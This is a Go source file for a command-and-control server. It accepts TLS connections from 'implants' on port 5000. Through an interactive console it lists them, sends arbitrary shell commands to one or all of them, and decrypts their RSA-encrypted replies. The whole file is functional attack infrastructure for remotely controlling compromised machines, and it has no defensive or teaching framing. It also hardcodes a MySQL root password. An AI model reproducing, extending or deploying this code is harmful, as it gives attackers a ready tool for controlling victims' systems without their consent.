package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"github.com/peterh/liner"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"

	_ "github.com/go-sql-driver/mysql"
)

var implants = make(map[string]net.Conn)
var mutex sync.Mutex
var db *sql.DB
var privateKey *rsa.PrivateKey

func main() {
	baseDir := getBaseDir()
	if err := loadPrivateKey(filepath.Join(baseDir, "certs", "rsa_private.pem")); err != nil {
		fmt.Println("[-]", err)
		return
	}
	initDB()

	cert, err := tls.LoadX509KeyPair(
		filepath.Join(baseDir, "certs", "server.crt"),
		filepath.Join(baseDir, "certs", "server.key"),
	)
	if err != nil {
		panic(err)
	}

	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	ln, err := tls.Listen("tcp", ":5000", config)
	if err != nil {
		panic(err)
	}
	defer ln.Close()

	fmt.Println("[+] C2 Server (TLS) running on port 5000...")
	go acceptConnections(ln)

	startCLI()

	if db != nil {
		db.Close()
	}
}

func loadPrivateKey(path string) error {
	keyData, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("read private key: %w", err)
	}

	block, _ := pem.Decode(keyData)
	if block == nil {
		return fmt.Errorf("failed to decode RSA private key")
	}

	privateKey, err = x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return fmt.Errorf("parse private key: %w", err)
	}
	return nil
}

func initDB() {
	var err error
	db, err = sql.Open("mysql", "root:password@tcp(127.0.0.1:3306)/c2db")
	if err != nil {
		fmt.Println("[-] Failed to connect to MySQL:", err)
		db = nil
		return
	}
	if err = db.Ping(); err != nil {
		fmt.Println("[-] MySQL ping failed:", err)
		db.Close()
		db = nil
	}
}

func acceptConnections(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			if errors.Is(err, net.ErrClosed) {
				return
			}
			continue
		}
		addr := conn.RemoteAddr().String()
		fmt.Println("[+] Implant connected:", addr)

		mutex.Lock()
		implants[addr] = conn
		mutex.Unlock()
	}
}

func startCLI() {
	line := liner.NewLiner()
	defer line.Close()

	line.SetCtrlCAborts(true)
	line.SetCompleter(func(line string) []string {
		commands := []string{"list", "send", "broadcast", "remove", "help", "exit"}
		var suggestions []string
		for _, cmd := range commands {
			if strings.HasPrefix(cmd, line) {
				suggestions = append(suggestions, cmd)
			}
		}
		return suggestions
	})

	for {
		input, err := line.Prompt("C2 > ")
		if err != nil {
			break
		}

		line.AppendHistory(input)
		input = strings.TrimSpace(input)

		switch {
		case input == "list":
			listImplants()
		case strings.HasPrefix(input, "send"):
			args := strings.SplitN(input, " ", 3)
			if len(args) < 3 {
				fmt.Println("Usage: send <IP> <command>")
				continue
			}
			sendCommand(args[1], args[2])
		case strings.HasPrefix(input, "broadcast "):
			cmd := strings.TrimSpace(strings.TrimPrefix(input, "broadcast "))
			broadcastCommand(cmd)
		case strings.HasPrefix(input, "remove "):
			ip := strings.TrimSpace(strings.TrimPrefix(input, "remove "))
			removeImplant(ip)
		case input == "help":
			printHelp()
		case input == "exit":
			fmt.Println("[+] Exiting C2 Server...")
			closeAllImplants()
			return
		default:
			fmt.Println("[-] Unknown command")
		}
	}
}

func listImplants() {
	mutex.Lock()
	defer mutex.Unlock()
	if len(implants) == 0 {
		fmt.Println("[-] No active implants")
		return
	}
	fmt.Println("[+] Active Implants:")
	for ip := range implants {
		fmt.Println("   -", ip)
	}
}

func sendCommand(ip, command string) {
	mutex.Lock()
	conn, exists := implants[ip]
	mutex.Unlock()

	if !exists {
		fmt.Println("[-] Implant not found")
		return
	}

	_, err := conn.Write([]byte(command + "\n"))
	if err != nil {
		fmt.Println("[-] Failed to send command")
		conn.Close()
		mutex.Lock()
		delete(implants, ip)
		mutex.Unlock()
		return
	}

	reader := bufio.NewReader(conn)
	encResp, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println("[-] Failed to read response")
		conn.Close()
		mutex.Lock()
		delete(implants, ip)
		mutex.Unlock()
		return
	}
	encResp = strings.TrimSpace(encResp)
	cipherData, err := base64.StdEncoding.DecodeString(encResp)
	if err != nil {
		fmt.Println("[-] Invalid response encoding")
		return
	}
	plain, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, cipherData, nil)
	if err != nil {
		fmt.Println("[-] Decryption failed")
		return
	}
	fmt.Printf("[+] Response from %s: %s\n", ip, string(plain))
}

func broadcastCommand(command string) {
	mutex.Lock()
	ips := make([]string, 0, len(implants))
	for ip := range implants {
		ips = append(ips, ip)
	}
	mutex.Unlock()

	for _, ip := range ips {
		sendCommand(ip, command)
	}
}

func removeImplant(ip string) {
	mutex.Lock()
	conn, exists := implants[ip]
	if exists {
		conn.Close()
		delete(implants, ip)
	}
	mutex.Unlock()
	if exists {
		fmt.Printf("[+] Removed implant %s\n", ip)
	}
}

func closeAllImplants() {
	mutex.Lock()
	for ip, conn := range implants {
		conn.Close()
		delete(implants, ip)
	}
	mutex.Unlock()
}

func printHelp() {
	fmt.Println("Available commands:")
	fmt.Println("  list                 - list connected implants")
	fmt.Println("  send <IP> <cmd>      - send command to an implant")
	fmt.Println("  broadcast <cmd>      - send command to all implants")
	fmt.Println("  remove <IP>          - remove implant from list")
	fmt.Println("  help                 - show this message")
	fmt.Println("  exit                 - quit server")
}

func getBaseDir() string {
	exe, err := os.Executable()
	if err != nil {
		return "."
	}
	return filepath.Dir(exe)
}
